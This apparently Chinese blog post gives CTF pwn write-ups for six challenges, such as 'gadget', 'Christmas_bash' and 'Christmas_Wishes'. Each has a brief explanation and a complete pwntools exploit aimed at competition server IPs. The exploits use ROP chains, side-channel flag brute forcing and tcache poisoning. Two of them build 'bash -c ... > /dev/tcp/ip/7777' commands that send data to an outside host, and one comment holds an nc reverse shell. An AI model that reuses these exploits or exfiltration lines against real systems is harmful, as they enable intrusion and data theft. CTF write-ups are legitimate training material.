<!--yml
category: 未分类
date: 2022-04-26 14:55:24
-->

# CTF pwn 方向部分题解_普通网友的博客-CSDN博客_ctfpwn方向比赛题目及解析

> 来源：[https://blog.csdn.net/kali_Ma/article/details/122457773](https://blog.csdn.net/kali_Ma/article/details/122457773)

## dataleak

用”\或者/都可以跳过2个\x00，但是每次用”\会拷贝4个字节到buf中，导致最后的3字节数据无法泄露，所以用/\配合垃圾数据填充来控制泄露字符串。

```
exp:

#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './cJSON_PWN'
ip = '124.70.202.226'
port = 2101
remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC_VERSION = ''
HAS_LD = False
HAS_DEBUG = False

context(os='linux', arch='amd64')
context.log_level = 'debug'

def run(local = 1):
    LD_LIBRARY_PATH = './lib/'
    LD = LD_LIBRARY_PATH+'ld.so.6'
    global elf
    global p
    if local == 1:
        elf = ELF(elf_path, checksec = False)
        if LIBC_VERSION:
            if HAS_LD:
                p = process([LD, elf_path], env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
            else:
                p = process(elf_path, env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
        else:
            p = process(elf_path)
    else:
        p = remote(ip, port)

run(0)
payload = ' '*0xc + '"\\'
p.send(payload)

payload = 'a'*8 + ' '*4 + '"\\'
p.send(payload)
part1 = p.recv(11)

payload = 'a'*5 + ' '*7 + '/*'
p.send(payload)

payload = ' '*12 + '/*'
p.send(payload)
part2 = p.recv(11)

complete = part1 + part2
sa('data', complete)

p.interactive() 
```

> **[【一>所有资源获取<一】](https://shimo.im/docs/C9WxVrD6V3tGcjgQ/)**
> 1、200份很多已经买不到的绝版电子书
> 2、30G安全大厂内部的视频资料
> 3、100份src文档
> 4、常见安全面试题
> 5、ctf大赛经典题目解析
> 6、全套工具包
> 7、应急响应笔记
> 8、网络安全学习路线

## gadget

有栈溢出，但是只能使用调用号为0，5，37的系统调用，5是32位下的open，所以利用思路是先heaven’s gate切换到32位来open flag，再回到64位read flag，最后找一个gadget用来侧信道获取flag。

主要难点在于找gadget，有4个比较重要的gadget。首先是0x40A756用于设置rdx，但需要zf位为1才能正常执行，因此用0x40106D来设置zf。然后是0x40172A用来栈迁移，最后用0x408F72侧信道方式拿到flag。

```
exp:

from pwn import *

read_addr=0x401170
retfq=0x4011EC
int80=0x4011F3
syscall=0x408865
flag=0x40D480
pop_rax=0x401001
pop_rbp=0x401102
pop_rbx_24=0x403072
pop_rcx=0x4092D0
pop_rdi_8=0x401734
pop_rsi_16=0x401732
pop_rdx_48=0x40A756
flag_addr=0x40D260
lea_rsp=0x40172A
set2z=0x40106D
cmpa=0x408F72
loop=0x40A765

bit32=p64(0x23)
bit64=p32(0x33)

fmap=[ord('_')]
fmap+=[i for i in range(ord('a'),ord('z')+1)]
fmap+=[i for i in range(ord('0'),ord('9')+1)]
fmap+=[i for i in range(ord('A'),ord('Z')+1)]
fmap+=[0,ord('@'),ord('-'),ord('{'),ord('}'),ord('?'),ord('!')]
f=''
c=len(f)
if_ok=False
while(not if_ok):
    caddr=flag+c
    sign=0
    for guess in fmap:
        #sh=process('./gadget')
        sh=remote('121.37.135.138',2102)
        payload="a"*0x38+p64(pop_rdi_8)+p64(flag_addr)+p64(0)+p64(read_addr)+p64(set2z)+p64(pop_rdx_48)+p64(0)*7
        payload+=p64(pop_rbp)+p64(flag_addr+8-0x28+0x20)+p64(lea_rsp)
        #print(hex(len(payload)))
        sh.send(payload.ljust(0xc0,'a'))

        payload2="flag\x00\x00\x00\x00"
        payload2+=p64(retfq)+p64(pop_rbx_24)+bit32+p32(flag_addr)+p32(0)*3+p32(pop_rcx)+p32(0)+p32(pop_rax)+p32(5)+p32(int80)
        payload2+=p32(retfq)+p32(pop_rdi_8)+bit64
        payload2+=p64(flag_addr+len(payload2)+24)+p64(0)+p64(read_addr)
        #print(hex(len(payload2)))
        sh.send(payload2.ljust(0xc0,'\x00'))

        payload3=p64(pop_rdi_8)+p64(3)+p64(0)+p64(pop_rsi_16)+p64(flag)+p64(0)*2+p64(pop_rax)+p64(0)+p64(syscall)
        payload3+=p64(pop_rdi_8)+p64(caddr+1)+p64(0)+p64(read_addr)
        payload3+=p64(pop_rsi_16)+p64(0)+p64(caddr-0x38)+p64(0)+p64(pop_rax)+p64(guess)+p64(cmpa)
        #print(hex(len(payload3)))
        sh.send(payload3.ljust(0xc0,'\x00'))

        payload4='\x00'*0xf+p64(0)
        sh.send(payload4)
        try:
            sh.send('ok')
            sh.recv(timeout=0.5)
            if(not guess):
                if_ok=True
                sign=1
                break
            f+=chr(guess)
            print(f)
            sh.close()
            sign=1
            break
        except:
            sh.close()
    if(not sign):
        f+='#'
    c=c+1
print(f)
sh.interactive() 
```

## Christmas_song

难点在于看懂slang语言的语法，主要在源码com目录下parser.y和scanner.l这两个文件中。可知定义变量语法为gift 变量名 is xxx，xxx可以为整数也可以为字符串，其中is等同于运算符‘=’，为字符串时变量实际上是一个堆块地址。调用函数的语法为reindeer 函数名 delivering gift 参数1 参数2 参数3 brings back gift 返回值; ，其中返回值可省略。逆向可知Dancer和Dasher两个函数分别可以打开和读取flag，之后用相当于strncmp的Prancer函数比较读入的flag侧信道获取flag即可。

```
exp:

from pwn import *
import string

code="""
gift a is "/home/ctf/flag";
gift b is 0;
gift c is 0;
gift d is 64;
gift len is {};
gift test is "abcde";
gift flag is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
gift guess is "{}";

reindeer Dancer delivering gift a b c brings back gift fd;
reindeer Dasher delivering gift fd flag d;
reindeer Prancer delivering gift flag guess len brings back gift e;
gift f is test+e;
reindeer Dancer delivering gift f b c;
"""

flag=""
if_ok=False
dic = '_'+string.ascii_letters + string.digits + "}"
while(not if_ok):
    for x in dic:
        sh=remote("124.71.144.133",2144)
        flag=flag+x
        c=len(flag)
        c_code=code.format(c,flag)
        sh.sendlineafter("(EOF to finish):\n",c_code+"EOF")
        sh.recvuntil('error')
        res=sh.recvline()
        #print(res)
        if(res[-6:-1]!="abcde"):
            flag=flag[:-1]
            sh.close()
        else:
            sh.close()
            print(flag)
            if(x=='}'):
                if_ok=True
            break 
```

## Christmas_bash

远程爆破出sleep的偏移为0xed850，但搜不到对应的libc，最后才发现版本为2.34。根据sleep算出system，pop rdi和environ的值，用他们来定义变量，再定义一个存储vm_call_lambda返回时rsp的变量stack。然后调用一个不存在的函数，其返回值为一个堆上的地址，调试得到它与之前定义的变量地址的偏移。然后将environ上的栈地址拷贝到stack处，再根据偏移得到vm_call_lambda返回时的rsp。最后把各变量值用memcpy拷贝到rsp处构造出rop链。

```
code:

code="""
gift libcbase is sleep-972880;
gift environ is libcbase+2232000;
gift stack is sleep-16;
gift len is 8;
gift cmd is "bash -c '/home/ctf/getflag > /dev/tcp/ip/7777'";
gift cmdaddr is cmd+1;

reindeer haha delivering gift len len len brings back gift addr;
gift stackaddr is addr+5848;

reindeer Vixen delivering gift stackaddr environ len;
gift stack is stack-1184;
gift poprdi is libcbase+190149;
gift system is libcbase+346848;
gift ret is poprdi+1;

gift cmdaddraddr is addr+6104;
gift systemaddr is addr+6488;
gift poprdiaddr is addr+6456;
gift retaddr is addr+6520;

reindeer Vixen delivering gift stack retaddr len;
gift stacka is stack+8;

reindeer Vixen delivering gift stacka poprdiaddr len;
gift stacka is stacka+8;

reindeer Vixen delivering gift stacka cmdaddraddr len;
gift stacka is stacka+8;

reindeer Vixen delivering gift stacka systemaddr len;
gift stacka is stacka+8;
""" 
```

## Christmas_Wishes

"字符截断parserstring堆长度统计逻辑，然后之后可以拷贝很长的字符串，造成堆溢出，键同名free，tcacheattack

```
exp：

#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

def chose(idx):
    sla('Chose', str(idx))
def add(name = '', value = ''):
    global payload
    payload += '"{}":"{}",'.format(name, value)
def package(content):
    if len(content) & 1:
        print('eeee')
    ans = ''
    for i in range(len(content)/2):
        ans += '\\u' + content[i*2:i*2+2].encode('hex')
    return ans

libc_addr = 0x7fd19f744000
loadlibc()
libc.address = libc_addr
# print(hex(libc.sym['__free_hook']))

shell = 'bash -c \'/This_is_your_gift > /dev/tcp/ip/7777\''
# shell = 'nc ip 7777|/bin/bash|nc ip 9999'

global payload
payload = ''
# for i in range(10):
#     add('a'*0x18 + str(i), 'a'*0x20)
add('a'*0x18 + 'a1', 'a'*0x20)
add('a'*0x18 + 'a2', 'a'*0x20)
add('a'*0x18 + 'a3', 'a'*0x20)
add('a'*0x18 + 'a4', 'a'*0x20)
add('a5', shell)
add('a'*0x18 + 'a1', 'b'*0x10)
add('a'*0x18 + 'a3', 'b'*0x10)
add('a'*0x20 + '\\"' + 'a'*0x6 + package(p64(0x31)) + package(p64(libc.sym['__free_hook'])), 'a'*0x20)
add(package(p64(libc.sym['system'])), 'a'*0x10)
add('a5', 'aa')
payload = '{' + payload + '}'
print(payload)
with open('payload', 'w') as f:
    f.write(payload)
payload：

{"aaaaaaaaaaaaaaaaaaaaaaaaa1":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa2":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa3":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa4":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","a5":"bash -c '/This_is_your_gift > /dev/tcp/49.232.202.102/7777'","aaaaaaaaaaaaaaaaaaaaaaaaa1":"bbbbbbbbbbbbbbbb","aaaaaaaaaaaaaaaaaaaaaaaaa3":"bbbbbbbbbbbbbbbb","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"aaaaaa\u3100\u0000\u0000\u0000\u705e\u909f\ud17f\u0000":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","\u50ce\u789f\ud17f\u0000":"aaaaaaaaaaaaaaaa","a5":"aa",} 
```

## Checkin_ret2text

自动化写不出，半自动跑，先下载文件，然后151行pause前手动分析完对应参数

```
exp：

#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep
from hashlib import sha256
import base64

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './x2.elf'
ip = '123.60.82.85'
port = 1447
remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC_VERSION = ''
HAS_LD = False
HAS_DEBUG = False

context(os='linux', arch='amd64')
context.log_level = 'debug'

def run(local = 1):
    LD_LIBRARY_PATH = './lib/'
    LD = LD_LIBRARY_PATH+'ld.so.6'
    global elf
    global p
    if local == 1:
        elf = ELF(elf_path, checksec = False)
        if LIBC_VERSION:
            if HAS_LD:
                p = process([LD, elf_path], env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
            else:
                p = process(elf_path, env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
        else:
            p = process(elf_path)
    else:
        p = remote(ip, port)
def debug(cmdstr=''):
    if HAS_DEBUG and LIBC_VERSION:
        DEBUG_PATH = '/opt/patchelf/libc-'+LIBC_VERSION+'/x64/usr/lib/debug/lib/x86_64-linux-gnu/'
        cmd='source /opt/patchelf/loadsym.py\n'
        cmd+='loadsym '+DEBUG_PATH+'libc-'+LIBC_VERSION+'.so\n'
        cmdstr=cmd+cmdstr
    gdb.attach(p, cmdstr)
    pause()
def loadlibc(filename = remote_libc_path):
    global libc
    libc = ELF(filename, checksec = False)
def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
def str2int(s, info = '', offset = 0):
    if type(s) == int:
        s = p.recv(s)
    ret = u64(s.ljust(8, '\x00')) - offset
    success('%s ==> 0x%x'%(info, ret))
    return ret

def chose(idx):
    sla('Chose', str(idx))
def add(idx, size, content = '\n'):
    chose(1)
    sla('Index', str(idx))
    sla('Size', str(size))
    sa('Content', content)
def edit(idx, content):
    chose(2)
    sla('Index', str(idx))
    sa('Content', content)
def free(idx):
    chose(3)
    sla('Index', str(idx))
def show(idx):
    chose(4)
    sla('Index', str(idx))
def hash_digit(af, hash_hex):
    print(af, hash_hex)
    ch = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    for i in ch:
        for j in ch:
            for k in ch:
                for h in ch:
                    if sha256(i + j + k + h + af).hexdigest() == hash_hex:
                        return i + j + k + h
def get_file(filename):
    p.recvuntil('sha256(xxxx + ')
    hash = p.recvuntil(')')[:-1]
    p.recvuntil('== ')
    hash_hex = p.recvuntil('\n')[:-2]
    ans = hash_digit(hash, hash_hex)
    print(ans)
    sla('give me xxxx:\n', ans)
    base64_e = p.recvuntil('==end==\n')[:-8]
    with open(filename, 'wb') as f:
        global elf
        elf = base64.b64decode(base64_e)
        f.write(elf)
def analysis(begin_addr):
    begin_addr += 0x18
    ranks = []

    def u32(content):
        return int(content[::-1].encode('hex'), 16)
    def insert(vec):
        for i, v in enumerate(ranks):
            if vec[0] < v[0]:
                ranks.insert(i, vec)
                return
        ranks.append(vec)
    def get_a_string(addr):
        ans = ''
        while elf[addr] != '\0':
            ans += elf[addr]
            addr += 1
        return ans

    addr = begin_addr
    n = ord(elf[addr+1])
    addr += 13
    for i in range(n):
        rk = u32(elf[addr+3: addr+7])
        va = u32(elf[addr+9])
        if va == 0x88:
            if elf[addr+7: addr+9] == '\xf7\xd0':
                va = 0xff
                addr -= 1
        if va == 0x2b:
            if elf[addr+7: addr+9] == '\x88\x85':
                va = 0
                addr -= 3
        # print(hex(rk))
        addr += 0x10
        insert((rk, va))
    # for i in ranks:
    #     print(hex(i[0]), hex(i[1]))
    print(hex(addr))
    addr += 0xa
    string_addr = addr + u32(elf[addr: addr+4]) + 4
    # print(hex(string_addr))
    string = get_a_string(string_addr)
    # print(string)
    ans = ''
    for i, v in enumerate(ranks):
        ans += chr(ord(string[i])^v[1])
    return ans

run(0)
get_file('x2.elf')

pause()
import datas
data = datas.data.split('\n')[-2::-1]
for i, v in enumerate(data):
    tmp = v.split(' ')
    if len(tmp) == 1 or len(tmp) == 2:
        if tmp[0] == 'EOF':
            data[i] = 'a' * int(tmp[1], 16)
        else:
            data[i] = analysis(int(tmp[0], 16))
    else:
        data[i] = ['0'] * int(tmp[0])
        data[i][int(tmp[1])] = tmp[2]

print(data)

for i in data:
    if type(i) == str:
        sa(':', i)
    else:
        p.recvuntil(':')
        for j in i:
            p.send(j+' ')

backdoor = p64(0x401354) * 10
payload = 'a'*datas.offset + backdoor
p.sendline(payload)
sleep(0.1)
p.sendline('cat flag')
p.interactive()
分析结果填入datas.py

data = '''8 0 31292
dde6
DA3E
8 0 0
C926
6 0 0
EOF 24
'''

offset = 0x0 
```

然后跑就出了